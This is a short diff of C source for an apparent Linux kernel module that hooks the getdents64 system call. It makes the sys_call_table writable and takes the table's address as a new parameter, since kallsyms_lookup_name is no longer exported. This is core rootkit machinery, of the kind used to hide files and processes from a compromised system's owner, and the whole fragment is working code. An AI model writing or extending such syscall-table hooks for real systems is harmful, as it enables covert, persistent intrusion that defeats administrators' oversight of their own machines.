@@ -81,10 +81,10 @@ void set_page_no_write(unsigned long addr)
     printk(KERN_ALERT "modify the page frame to read only");
 
 }
-int replace_getdents_syscall(void)
+int replace_getdents_syscall(unsigned long * sys_call_table_addr)
 {
-    sys_call_table = (unsigned long *) kallsyms_lookup_name("sys_call_table");
-
+    //sys_call_table = (unsigned long *) kallsyms_lookup_name("sys_call_table"); delated because of unexported kallsymslookupname
+    sys_call_table = sys_call_table_addr;
     if (sys_call_table != 0)
     {
         if (set_page_write((unsigned long) sys_call_table))
@@ -118,10 +118,10 @@ void remove_hook(void)
             return ;
         }
 }
-int getdents_hook_init(void)
+int getdents_hook_init(unsigned long * sys_call_table_addr)
 {
     printk(KERN_ALERT "load the module");
-    if (!replace_getdents_syscall())
+    if (!replace_getdents_syscall(sys_call_table_addr))
     {  
         printk(KERN_ALERT "error, couldent replace the getdents64");
         return -1;
